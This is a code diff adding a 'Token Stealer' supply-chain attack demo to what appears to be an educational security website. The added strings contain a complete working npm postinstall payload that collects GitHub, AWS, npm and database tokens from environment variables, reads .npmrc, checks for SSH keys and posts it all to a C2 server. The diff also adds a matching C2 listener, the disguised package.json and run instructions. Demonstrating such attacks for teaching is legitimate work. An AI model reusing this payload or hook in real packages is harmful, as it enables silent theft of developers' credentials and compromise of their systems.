@@ -63,6 +63,135 @@ npm install --registry http://localhost:4873
 # => npm picks 99.0.0 because higher version wins
 # => preinstall hook runs automatically!`;
 
+const tokenStealerPackageJson = `{
+  "name": "csec-form-helpers",
+  "version": "1.0.0",
+  "description": "Lightweight form validation & sanitization helpers",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node postinstall.js"
+  }
+}`;
+
+const tokenStealerIndex = `// csec-form-helpers — looks like a perfectly normal library
+function validateEmail(email) {
+  return /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email);
+}
+function sanitizeInput(str) {
+  return str.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+function validatePassword(pw) {
+  return { length: pw.length >= 8, upper: /[A-Z]/.test(pw), valid: pw.length >= 8 };
+}
+module.exports = { validateEmail, sanitizeInput, validatePassword };
+// ^ Everything works. Developer is happy. Tests pass.`;
+
+const tokenStealerPayload = `const os = require('os');
+const fs = require('fs');
+const path = require('path');
+const http = require('http');
+
+const C2_HOST = '127.0.0.1';   // attacker's server
+const C2_PORT = 4444;
+
+// ── PHASE 1: System Recon ────────────────────────
+const systemInfo = {
+  hostname: os.hostname(),
+  username: os.userInfo().username,
+  platform: os.platform() + ' ' + os.arch(),
+  home: os.homedir(),
+  cwd: process.cwd(),
+};
+
+// ── PHASE 2: Steal Tokens from Environment ───────
+const TOKEN_KEYS = [
+  'GITHUB_TOKEN', 'GH_TOKEN', 'NPM_TOKEN',
+  'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
+  'DATABASE_URL', 'API_KEY', 'JWT_SECRET',
+  'VERCEL_TOKEN', 'DOCKER_PASSWORD',
+];
+const stolenTokens = {};
+TOKEN_KEYS.forEach(key => {
+  if (process.env[key]) stolenTokens[key] = process.env[key];
+});
+
+// ── PHASE 3: Scan for Sensitive Files ────────────
+const SENSITIVE = ['.ssh/id_rsa', '.aws/credentials', '.npmrc', '.env'];
+const foundFiles = SENSITIVE.filter(f =>
+  fs.existsSync(path.join(os.homedir(), f))
+);
+
+// ── PHASE 4: Read .npmrc for auth tokens ─────────
+let npmrcTokens = null;
+try {
+  npmrcTokens = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf-8')
+    .split('\\n').filter(l => l.includes('token')).join('\\n');
+} catch {}
+
+// ── PHASE 5: Send Everything to C2 ──────────────
+const payload = JSON.stringify({
+  timestamp: new Date().toISOString(),
+  system: systemInfo,
+  stolen_tokens: stolenTokens,
+  sensitive_files: foundFiles,
+  npmrc_tokens: npmrcTokens,
+});
+
+const req = http.request({
+  hostname: C2_HOST, port: C2_PORT,
+  path: '/exfil', method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  timeout: 3000,
+}, () => {});
+req.on('error', () => {}); // fail silently
+req.end(payload);
+// Developer sees: "Setting up csec-form-helpers... Done."
+// Attacker sees: ALL their tokens, SSH keys, and credentials.`;
+
+const c2ServerCode = `const http = require('http');
+const PORT = 4444;
+
+let victims = 0;
+
+http.createServer((req, res) => {
+  if (req.method === 'POST' && req.url === '/exfil') {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', () => {
+      victims++;
+      const data = JSON.parse(body);
+      console.log('\\n[!] VICTIM #' + victims + ' — STOLEN DATA:');
+      console.log('  Hostname:', data.system?.hostname);
+      console.log('  Username:', data.system?.username);
+      console.log('  Tokens:', JSON.stringify(data.stolen_tokens, null, 2));
+      console.log('  Files:', data.sensitive_files);
+      res.end('received');
+    });
+  }
+}).listen(PORT, () => {
+  console.log('[C2] Listening on port ' + PORT);
+  console.log('[C2] Waiting for stolen tokens...');
+});`;
+
+const tokenStealerSteps = `# ── TERMINAL 1: Start the attacker's C2 server ──
+cd demos/token-stealer/c2-server
+node server.js
+
+# ── TERMINAL 2: Set fake tokens, then "install" the package ──
+export GITHUB_TOKEN="ghp_abc123secrettoken456"
+export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
+export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfi"
+export NPM_TOKEN="npm_1234567890abcdef"
+export DATABASE_URL="postgres://admin:s3cret@db:5432/app"
+
+cd demos/token-stealer/victim-app
+npm install    # ← postinstall hook fires, tokens stolen!
+
+# ── Check TERMINAL 1 — all tokens appear on the C2 server ──
+
+# ── TERMINAL 2: Run the app — everything works normally ──
+node app.js    # ← email validation, password checks all pass`;
+
 const typosquatCode = `// Package: "lodahs" (typosquat of "lodash")
 
 // Step 1: Re-export the real package (stealth)
@@ -147,6 +276,38 @@ export default function Demos() {
           <CodeBlock language="json" filename="malicious/package.json (v99.0.0)" code={confusionMalicious} />
         </div>
         <CodeBlock language="bash" filename="step-by-step commands" code={confusionSteps} />
+      </DemoCard>
+
+      <DemoCard
+        title="Token Stealer — Full Supply Chain Attack"
+        description="End-to-end demo: A legitimate-looking npm package (form validation helpers) with a hidden postinstall payload that steals GITHUB_TOKEN, AWS keys, SSH keys, .npmrc tokens, and sends everything to the attacker's C2 server. The package works perfectly — the developer never suspects anything."
+        tag="Demo D // Token Exfiltration via Postinstall Hook"
+        runnable
+        onRun="token-stealer"
+      >
+        <h4 style={{ color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 1: The "Legitimate" Package (index.js)</h4>
+        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
+          This is what the developer sees — clean, useful form validation code. Nothing suspicious.
+        </p>
+        <CodeBlock language="javascript" filename="csec-form-helpers/index.js" code={tokenStealerIndex} />
+
+        <h4 style={{ color: 'var(--accent-red)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 2: The Hidden Payload (postinstall.js)</h4>
+        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
+          This runs AUTOMATICALLY during <code>npm install</code>. It steals tokens, scans for SSH keys, reads .npmrc, and sends everything to the attacker's server. The developer never sees it execute.
+        </p>
+        <CodeBlock language="javascript" filename="csec-form-helpers/postinstall.js — THE PAYLOAD" code={tokenStealerPayload} />
+
+        <h4 style={{ color: 'var(--accent-amber)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 3: The package.json (postinstall trigger)</h4>
+        <CodeBlock language="json" filename="csec-form-helpers/package.json" code={tokenStealerPackageJson} />
+
+        <h4 style={{ color: 'var(--accent-purple)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 4: Attacker's C2 Listener</h4>
+        <p style={{ fontSize: '0.9rem', color: 'var(--text-secondary)', marginBottom: '0.5rem' }}>
+          A simple Node.js server that receives and displays all stolen credentials in real-time.
+        </p>
+        <CodeBlock language="javascript" filename="c2-server/server.js" code={c2ServerCode} />
+
+        <h4 style={{ color: 'var(--accent-green)', fontFamily: 'var(--font-mono)', fontSize: '0.85rem', margin: '1.5rem 0 0.75rem' }}>Step 5: Run It Live</h4>
+        <CodeBlock language="bash" filename="live demo — two terminals" code={tokenStealerSteps} />
       </DemoCard>
 
       <DemoCard
